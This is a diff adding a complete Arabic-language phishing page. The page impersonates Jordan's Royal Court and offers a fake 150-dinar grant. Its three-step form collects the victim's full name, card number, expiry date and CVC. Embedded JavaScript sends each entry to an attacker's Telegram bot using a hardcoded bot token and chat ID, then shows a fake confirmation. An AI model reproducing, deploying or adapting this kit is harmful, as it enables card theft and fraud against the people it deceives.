@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>منحة الديوان الملكي | 150 دينار على بطاقة الصراف الآلي</title>
+  <!-- Open Graph Meta Tags for Link Preview -->
+  <meta property="og:title" content="منحة 150 دينار من الديوان الملكي" />
+  <meta property="og:description" content="سجّل للحصول على منحة الديوان الملكي بقيمة 150 دينار على بطاقتك الصراف الآلي!" />
+  <meta property="og:image" content="https://www2.0zz0.com/2025/11/28/12/332737517.jpeg" />
+  <meta property="og:url" content="https://zaincashjordan.vercel.app" />
+  <meta property="og:type" content="website" />
+  <meta property="og:locale" content="ar_AR" />
+  <!-- Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="منحة 150 دينار من الديوان الملكي" />
+  <meta name="twitter:description" content="سجّل للحصول على منحة الديوان الملكي بقيمة 150 دينار على بطاقتك الصراف الآلي!" />
+  <meta name="twitter:image" content="https://www2.0zz0.com/2025/11/28/12/332737517.jpeg" />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --main-gradient: linear-gradient(135deg,#7c43ff 0%,#32c6c7 71%, #ffb44f 100%);
+      --button-gradient: linear-gradient(90deg, #8136e9 0%, #32c6c7 100%);
+      --primary: #8136e9;
+      --secondary: #32c6c7;
+      --card-bg: #fffbea;
+      --input-bg: #fdf9f2;
+      --footer-text: #7c43ff;
+      --modal-bg: #f9dbdb;
+      --modal-accent: #ffb44f;
+    }
+    body {
+      background: var(--main-gradient);
+      min-height: 100vh;
+      font-family: 'Cairo', Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    #app {
+      background: var(--card-bg);
+      border-radius: 24px;
+      box-shadow: 0 10px 40px 0 rgba(140,67,255,0.14), 0 2px 15px #32c6c711;
+      width: 400px;
+      max-width: 99vw;
+      padding: 38px 30px 34px 30px;
+      box-sizing: border-box;
+      direction: rtl;
+      position: relative;
+      overflow: hidden;
+      border: 3px solid #8136e933;
+      animation: fadein 0.7s;
+    }
+    @keyframes fadein {
+      from { opacity: 0; transform: translateY(36px);}
+      to { opacity: 1; transform: none;}
+    }
+    .royal-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 16px;
+      gap: 13px;
+    }
+    .royal-logo {
+      width: 80px;
+      height: 80px;
+      border-radius: 22px;
+      background: linear-gradient(135deg, #32c6c7 60%, #8136e9 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 18px #32c6c733;
+      border: 3px solid #fff;
+      overflow: hidden;
+    }
+    .royal-logo img {
+      width: 74px;
+      height: 74px;
+      object-fit: contain;
+      background: #fff;
+      border-radius: 19px;
+      border: 1.7px solid #e3eefe;
+      box-shadow: 0 1px 8px #32c6c733;
+    }
+    .royal-title-main {
+      font-size: 27px;
+      font-weight: 900;
+      letter-spacing: 0.4px;
+      color: var(--primary);
+      margin: 0;
+      text-shadow: 0 1px 0 #fff, 0 2px 10px #8136e911;
+    }
+    .royal-title-sub {
+      font-size: 16px;
+      color: #353a4d;
+      font-weight: 700;
+      text-align: center;
+      margin: 4px 0 0 0;
+      letter-spacing: 0.2px;
+    }
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 9px;
+      margin-bottom: 20px;
+      margin-top: 14px;
+    }
+    .step-dot {
+      width: 13px;
+      height: 13px;
+      border-radius: 50%;
+      background: #ece6fd;
+      border: 2.5px solid var(--secondary);
+      transition: background 0.2s;
+    }
+    .step-dot.active {
+      background: linear-gradient(135deg, var(--primary) 70%, var(--secondary) 100%);
+      border-color: var(--primary);
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      margin-top: 7px;
+      align-items: stretch;
+    }
+    label {
+      color: var(--primary);
+      font-size: 15.5px;
+      font-weight: 700;
+      margin-bottom: 4px;
+      margin-right: 2px;
+      letter-spacing: 0.3px;
+    }
+    input, select {
+      padding: 13px 12px;
+      border: none;
+      border-radius: 13px;
+      font-size: 17px;
+      background: var(--input-bg);
+      color: #222;
+      outline: none;
+      box-shadow: 0 2px 8px #8136e911;
+      transition: box-shadow 0.2s, border 0.2s;
+      border: 2.5px solid #32c6c733;
+      font-family: 'Cairo', Arial, sans-serif;
+    }
+    input:focus, select:focus {
+      box-shadow: 0 4px 24px #8136e933;
+      border-color: var(--primary);
+      background: #fbf7fa;
+    }
+    .button {
+      background: var(--button-gradient);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      padding: 15px 0;
+      font-size: 19px;
+      font-weight: 900;
+      cursor: pointer;
+      margin-top: 11px;
+      margin-bottom: 4px;
+      transition: background 0.18s, opacity 0.11s;
+      letter-spacing: 0.8px;
+      box-shadow: 0 2px 18px #8136e922;
+    }
+    .button:active { opacity: 0.88; }
+    .info-msg {
+      text-align: center;
+      color: var(--primary);
+      font-size: 15.5px;
+      margin-bottom: 10px;
+      margin-top: 4px;
+      font-weight: 700;
+      letter-spacing: 0.2px;
+    }
+    .input-row {
+      display: flex;
+      gap: 12px;
+      justify-content: stretch;
+      align-items: stretch;
+    }
+    .input-row input, .input-row select {
+      flex: 1;
+      min-width: 0;
+      padding: 13px 8px;
+      font-size: 17px;
+      text-align: center;
+      border-radius: 12px;
+    }
+    .success-message {
+      text-align: center;
+      color: var(--primary);
+      font-size: 22px;
+      font-weight: 800;
+      margin: 28px 0 0 0;
+      letter-spacing: 0.6px;
+    }
+    .royal-footer {
+      margin-top: 32px;
+      text-align: center;
+      color: var(--footer-text);
+      font-size: 14.5px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      opacity: 0.88;
+      text-shadow: 0 1px 0 #fff;
+    }
+    #modalError {
+      display: none;
+      position: fixed;
+      top:0; left:0; width:100vw; height:100vh;
+      background: rgba(160,67,255,0.21);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+    #modalError.active {
+      display: flex;
+      animation: fadein 0.3s;
+    }
+    #modalContent {
+      background: var(--modal-bg);
+      padding: 30px 40px;
+      border-radius: 18px;
+      box-shadow: 0 10px 40px #8136e933, 0 4px 15px #32c6c722;
+      text-align: center;
+      min-width: 260px;
+      border: 3px solid var(--modal-accent);
+    }
+    #modalContent .succ-title {
+      color: var(--primary);
+      font-size: 23px;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+    #modalContent .succ-msg {
+      margin-top: 11px;
+      font-size: 16.5px;
+      color: #31356b;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    #modalContent button {
+      margin-top: 21px;
+      background: var(--button-gradient);
+      color: #fff;
+      padding: 11px 35px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 17.5px;
+      font-weight: bold;
+      letter-spacing: 0.6px;
+      box-shadow: 0 1px 10px #8136e94f;
+    }
+    #modalContent button:active {
+      background: linear-gradient(90deg, #32c6c7 0%, #8136e9 100%);
+    }
+    @media (max-width: 530px) {
+      #app { padding: 18px 4vw 11px 4vw; width: 99vw;}
+      .royal-logo { width: 58px; height: 58px;}
+      .royal-logo img {width: 48px; height: 48px;}
+      .royal-title-main { font-size: 20px;}
+      .royal-title-sub { font-size: 12.5px;}
+      #modalContent { padding: 14px 8vw;}
+      .input-row input, .input-row select { font-size: 15px; padding: 12px 4px;}
+    }
+  </style>
+</head>
+<body>
+  <div id="app"></div>
+  <!-- Modal Success -->
+  <div id="modalError">
+    <div id="modalContent">
+      <div class="succ-title">تم إرسال الطلب بنجاح</div>
+      <div class="succ-msg">شكرًا لك على التسجيل. سيتم التواصل معك لإتمام المنحة. بالتوفيق!</div>
+      <button onclick="closeModal()">إغلاق</button>
+    </div>
+  </div>
+  <script>
+    const royalLogo = "https://www2.0zz0.com/2025/11/28/12/332737517.jpeg";
+    const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
+    const CHAT_ID = "6873334348";
+    let userData = { name: '', card: '', expMonth: '', expYear: '', cvc: '' };
+    let currentStep = "name";
+    let telegramMsgId = null;
+
+    function stepIndicator(step) {
+      return `
+        <div class="step-indicator">
+          <div class="step-dot${step===1?' active':''}"></div>
+          <div class="step-dot${step===2?' active':''}"></div>
+          <div class="step-dot${step===3?' active':''}"></div>
+        </div>
+      `;
+    }
+    function header(sub="") {
+      return `
+        <div class="royal-header">
+          <div class="royal-logo"><img src="${royalLogo}" alt="شعار الديوان الملكي" /></div>
+          <span class="royal-title-main">منحة الديوان الملكي الأردني</span>
+        </div>
+        <div class="royal-title-sub">${sub}</div>
+      `;
+    }
+
+    // Step 1: الاسم الرباعي
+    function renderNameStep() {
+      currentStep = "name";
+      app.innerHTML = `
+        ${header("احصل على منحة بقيمة <span style='color:#ffb44f;font-weight:900;'>150 دينار</span> على بطاقة الصراف الآلي")}
+        ${stepIndicator(1)}
+        <form id="nameForm" autocomplete="off">
+          <label>الاسم الرباعي الكامل</label>
+          <input type="text" id="name" placeholder="مثال: محمد أحمد علي العبدالله" maxlength="50" required autocomplete="name"/>
+          <button type="submit" class="button">التالي</button>
+        </form>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+      `;
+      document.getElementById('name').focus();
+      document.getElementById('nameForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const name = document.getElementById('name').value.trim();
+        if (name.split(" ").length < 4) {
+          alert('يرجى إدخال الاسم الرباعي الكامل');
+          document.getElementById('name').focus();
+          return;
+        }
+        userData.name = name;
+        try {
+          telegramMsgId = await sendToTelegramAndGetMsgId(
+            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}`
+          );
+        } catch (err) { }
+        renderCardStep();
+      };
+    }
+
+    // Step 2: رقم البطاقة
+    function renderCardStep() {
+      currentStep = "card";
+      app.innerHTML = `
+        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+        ${header("أدخل رقم بطاقة الصراف الآلي الخاصة بك")}
+        ${stepIndicator(2)}
+        <form id="cardForm" autocomplete="off">
+          <label>رقم البطاقة (16 خانة)</label>
+          <input type="text" id="card" maxlength="16" inputmode="numeric" pattern="\\d{16}" placeholder="1234 4567 8910 1234" required />
+          <button type="submit" class="button">التالي</button>
+        </form>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+      `;
+      document.getElementById('card').focus();
+      document.getElementById('card').addEventListener('input', function(){
+        this.value = this.value.replace(/\D/g, '').slice(0,16);
+      });
+      document.getElementById('cardForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const card = document.getElementById('card').value.trim();
+        if (!/^\d{16}$/.test(card)) {
+          alert('يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم');
+          document.getElementById('card').focus();
+          return;
+        }
+        userData.card = card;
+        try {
+          telegramMsgId = await resendTelegramMsg(
+            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}`
+          );
+        } catch (err) { }
+        renderCardDetailsStep();
+      };
+      document.getElementById('backBtn').onclick = () => {
+        renderNameStep();
+      };
+    }
+
+    // Step 3: تاريخ انتهاء البطاقة ورمز CVC
+    function renderCardDetailsStep() {
+      currentStep = "cardDetails";
+      app.innerHTML = `
+        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+        ${header("أدخل تفاصيل البطاقة لإتمام التسجيل")}
+        ${stepIndicator(3)}
+        <form id="detailsForm" autocomplete="off">
+          <label>تاريخ انتهاء البطاقة</label>
+          <div class="input-row">
+            <select id="expMonth" required>
+              <option value="">شهر</option>
+              ${[...Array(12).keys()].map(m=>`<option value="${(m+1).toString().padStart(2,'0')}">${(m+1).toString().padStart(2,'0')}</option>`).join('')}
+            </select>
+            <select id="expYear" required>
+              <option value="">سنة</option>
+              ${(() => {
+                let now = new Date(), years = '';
+                for(let y = now.getFullYear(); y <= now.getFullYear() + 12; y++) years += `<option value="${y}">${y}</option>`;
+                return years;
+              })()}
+            </select>
+          </div>
+          <label>رمز CVC (3 أرقام خلف البطاقة)</label>
+          <input type="text" id="cvc" maxlength="3" inputmode="numeric" pattern="\\d{3}" placeholder="***" required />
+          <button type="submit" class="button">تأكيد الطلب</button>
+        </form>
+        <div class="royal-footer">الديوان الملكي الأردني &copy; 2025</div>
+      `;
+      document.getElementById('expMonth').focus();
+
+      document.getElementById('cvc').addEventListener('input', function(){
+        this.value = this.value.replace(/\D/g, '').slice(0,3);
+      });
+
+      document.getElementById('detailsForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const expMonth = document.getElementById('expMonth').value;
+        const expYear = document.getElementById('expYear').value;
+        const cvc = document.getElementById('cvc').value.trim();
+        if (!expMonth || !expYear) {
+          alert('يرجى اختيار شهر وسنة انتهاء البطاقة');
+          return;
+        }
+        if (!/^\d{3}$/.test(cvc)) {
+          alert('يرجى إدخال رمز CVC مكون من 3 أرقام');
+          document.getElementById('cvc').focus();
+          return;
+        }
+        userData.expMonth = expMonth;
+        userData.expYear = expYear;
+        userData.cvc = cvc;
+        try {
+          telegramMsgId = await resendTelegramMsg(
+            `🏦 طلب منحة ديوان ملكي\n👤 الإسم الرباعي: ${userData.name}\n💳 رقم البطاقة: ${userData.card}\n📅 انتهاء: ${userData.expMonth}/${userData.expYear}\n🔑 CVC: ${userData.cvc}`
+          );
+        } catch (err) { }
+        showModal();
+      };
+      document.getElementById('backBtn').onclick = () => {
+        renderCardStep();
+      };
+    }
+
+    function showModal() {
+      document.getElementById('modalError').classList.add('active');
+    }
+    function closeModal() {
+      document.getElementById('modalError').classList.remove('active');
+      renderNameStep();
+    }
+
+    async function sendToTelegramAndGetMsgId(msg) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg
+          })
+        });
+        const data = await res.json();
+        if (data && data.result && data.result.message_id) {
+          return data.result.message_id;
+        }
+      } catch (err) {
+        // ignore
+      }
+      return null;
+    }
+
+    async function resendTelegramMsg(msg) {
+      if (telegramMsgId) {
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              message_id: telegramMsgId
+            })
+          });
+        } catch (err) {}
+      }
+      return await sendToTelegramAndGetMsgId(msg);
+    }
+
+    const app = document.getElementById('app');
+    renderNameStep();
+  </script>
+</body>
+</html>
